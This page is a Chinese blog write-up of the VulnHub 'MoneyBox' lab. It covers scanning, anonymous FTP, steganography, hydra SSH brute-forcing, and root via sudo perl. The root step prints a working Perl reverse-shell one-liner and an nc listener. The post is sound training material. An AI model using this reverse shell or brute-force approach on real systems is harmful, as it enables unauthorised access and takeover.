@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>打靶-MoneyBox - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="打靶-MoneyBox" />
+<meta property="og:description" content="0x00 准备工作 靶场目标获取3个flag，难度简单。在vulnhub上下载靶机的ovf文件，先用VMware部署，发现访问不到靶机的ip，更换Vi" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-16T05:34:05+00:00" />
+<meta property="article:modified_time" content="2021-09-16T05:34:05+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="打靶-MoneyBox"/>
+<meta name="twitter:description" content="0x00 准备工作 靶场目标获取3个flag，难度简单。在vulnhub上下载靶机的ovf文件，先用VMware部署，发现访问不到靶机的ip，更换Vi"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" /><link rel="prev" href="https://hannibal0x.github.io/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/" /><link rel="next" href="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "打靶-MoneyBox",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-09-16-%E6%89%93%E9%9D%B6-moneybox\/"
+        },"genre": "posts","keywords": "渗透测试, Web安全","wordcount":  1489 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-09-16-%E6%89%93%E9%9D%B6-moneybox\/","datePublished": "2021-09-16T05:34:05+00:00","dateModified": "2021-09-16T05:34:05+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">打靶-MoneyBox</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-09-16">2021-09-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1489 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-准备工作">0x00 准备工作</a></li>
+    <li><a href="#0x01-flag1">0x01 flag1</a></li>
+    <li><a href="#0x02-flag2">0x02 flag2</a></li>
+    <li><a href="#0x03-flag3">0x03 flag3</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="0x00-准备工作">0x00 准备工作</h2>
+<p>靶场目标获取3个flag，难度简单。在vulnhub上下载靶机的ovf文件，先用VMware部署，发现访问不到靶机的ip，更换VirtualBox部署，关闭usb设备，网络设置为同一个NAT网络，即可。</p>
+<h2 id="0x01-flag1">0x01 flag1</h2>
+<p>通过二层扫描（arp-scan）同网段的存活IP，使用<code>arp-scan -I eth0 -l</code>， <code>-I 网卡 -l 本地网络</code>，找到靶机的ip为10.0.2.15<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-64.png" alt="" class="wp-image-3689" width="699" height="134" /> </figure></p>
+<p>使用<code>nmap -p- 10.0.2.15</code>扫描所有端口。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-66.png" alt="" class="wp-image-3691" width="557" height="176" /> </figure></p>
+<p>对这些端口进行服务识别，sV：版本检测是用来扫描目标主机和端口上运行的软件的版本。<code>nmap -p21,22,80 -sV 10.0.2.15</code>。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-67.png" alt="" class="wp-image-3692" width="652" height="214" /> </figure></p>
+<p>使用<code>nmap -p21 -sC 10.0.2.15</code>，sC：根据端口识别服务自动调用默认脚本。扫描发现，存在FTP匿名登录的漏洞。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-68.png" alt="" class="wp-image-3693" width="608" height="417" /> </figure></p>
+<p>SSH和HTTP服务无异常。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-69.png" alt="" class="wp-image-3694" width="595" height="444" /> </figure></p>
+<p>FTP连接，以Anonymous登录，密码为空，查看当前目录下的文件，发现有trytofind.jpg文件，可能隐藏信息，get到本机上。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-70.png" alt="" class="wp-image-3696" width="639" height="359" /> </figure></p>
+<p>图片没有明显的信息<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-72.png" alt="" class="wp-image-3698" width="551" height="414" /> </figure></p>
+<p>SSH服务可能需要暴力破解，渗透前期不推荐，看80端口的网页，web服务和源代码也没有啥信息，但提示不需要想得太复杂。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-71.png" alt="" class="wp-image-3697" width="438" height="423" /> </figure></p>
+<p>使用dirsearch扫描下目录，发现有一个响应码为301 的/blogs目录。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-73.png" alt="" class="wp-image-3700" width="590" height="301" /> </figure></p>
+<p>浏览器访问，网页信息显示已经被黑掉了，有一个hint。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1006" height="207" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-74.png" alt="" class="wp-image-3701" /> </figure></p>
+<p>查看源代码，发现有个隐藏文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="781" height="27" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-75.png" alt="" class="wp-image-3702" /> </figure></p>
+<p>访问文件，在源代码里面放了密钥。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="364" height="30" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-76.png" alt="" class="wp-image-3703" /> </figure></p>
+<p>通过strings命令发现图片中存在异常字符。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-77.png" alt="" class="wp-image-3704" width="480" height="179" /> </figure></p>
+<p>用steghide提取隐藏信息，输入之前获取的密钥，确实存在data.txt。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="568" height="215" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-78.png" alt="" class="wp-image-3705" /> </figure></p>
+<p>使用<code>steghide extract -sf trytofind.jpg</code>，提取信息。发现存在一个用户renu，密码很弱。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="968" height="179" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-79.png" alt="" class="wp-image-3706" /> </figure></p>
+<p>ssh字典爆破一下，先建立一个user.txt，<code>echo renu &gt; user.txt</code>，再找一个密码字典。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-80.png" alt="" class="wp-image-3708" width="508" height="38" /> </figure></p>
+<p>用nmap的ssh爆破脚本，运行一段时间后，没有响应了。</p>
+<pre class="wp-block-code"><code>nmap --script ssh-brute --script-args userdb=user.txt,passdb=rockyou.txt 10.0.2.15</code></pre>
+<p>更换hydra</p>
+<pre class="wp-block-code"><code>hydra -l renu -P rockyou.txt 10.0.2.15 ssh</code></pre>
+<p>顺利找到密码<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1098" height="380" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-81.png" alt="" class="wp-image-3709" /> </figure></p>
+<p>ssh登录<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-82.png" alt="" class="wp-image-3710" width="691" height="399" /> </figure></p>
+<h2 id="0x02-flag2">0x02 flag2</h2>
+<p>尝试sudo到root用户，由于不属于超级用户组，没有足够的权限。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-83.png" alt="" class="wp-image-3712" width="642" height="59" /> </figure></p>
+<p>查看历史命令，home目录下有lily目录，而home 目录用于存放用户文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="150" height="66" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-85.png" alt="" class="wp-image-3716" /> </figure></p>
+<p>切换到对应目录，得到flag。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="445" height="189" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-86.png" alt="" class="wp-image-3718" /> </figure></p>
+<h2 id="0x03-flag3">0x03 flag3</h2>
+<p>回到之前的history，发现renu把自己生成的ssh的密钥拷贝到了192.168.43.80的lily账号下，怀疑可以通过公钥身份认证登录到lily账号上。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="433" height="311" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-84.png" alt="" class="wp-image-3715" /> </figure></p>
+<p>查看在.ssh里查看公钥和私钥文件,lily的authorized_keys存在renu的公钥。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1104" height="365" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-87.png" alt="" class="wp-image-3719" /> </figure></p>
+<p>因此renu可以直接通过ssh登陆到lily账号。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="832" height="333" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-88.png" alt="" class="wp-image-3720" /> </figure></p>
+<p>继续查看history，发现<code>sudo -l</code>命令经常出现。显示出自己（执行 sudo 的使用者）的权限，lily用户可以在不需要密码的情况下使用Perl程序。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="932" height="171" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-89.png" alt="" class="wp-image-3722" /> </figure></p>
+<p>可以利用perl编写反弹shell的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo perl -e &#39;use Socket;$i=&#34;10.0.2.4&#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在kali上监听2333端口</p>
+<pre class="wp-block-code"><code>nc -nvlp 2333
+
+-g&lt;网关>   设置路由器跃程通信网关，最丢哦可设置8个。
+-G&lt;指向器数目>   设置来源路由指向器，其数值为4的倍数。
+-h   在线帮助。
+-i&lt;延迟秒数>   设置时间间隔，以便传送信息及扫描通信端口。
+-l   使用监听模式，管控传入的资料。
+-n   直接使用IP地址，而不通过域名服务器。
+-o&lt;输出文件>   指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
+-p&lt;通信端口>   设置本地主机使用的通信端口。
+-r   乱数指定本地与远端主机的通信端口。
+-s&lt;来源位址>   设置本地主机送出数据包的IP地址。
+-u   使用UDP传输协议。
+-v   显示指令执行过程。
+-w&lt;超时秒数>   设置等待连线的时间。
+-z   使用0输入/输出模式，只在扫描通信端口时使用。</code></pre>
+<p>连接成功，获得root权限<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1049" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-90.png" alt="" class="wp-image-3725" /> </figure></p>
+<p>进入root根目录，发现隐藏的.root.txt文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1082" height="780" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-91.png" alt="" class="wp-image-3726" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-09-16</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" data-title="打靶-MoneyBox" data-hashtags="渗透测试,Web安全"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" data-hashtag="渗透测试"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" data-title="打靶-MoneyBox"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" data-title="打靶-MoneyBox"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-09-16-%E6%89%93%E9%9D%B6-moneybox/" data-title="打靶-MoneyBox"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/" class="prev" rel="prev" title="pwnhub公开赛-【迎中秋】BabyExec"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>pwnhub公开赛-【迎中秋】BabyExec</a>
+            <a href="/2021-09-16-%E6%89%93%E9%9D%B6-hackademic-rtb1/" class="next" rel="next" title="打靶-Hackademic: RTB1">打靶-Hackademic: RTB1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
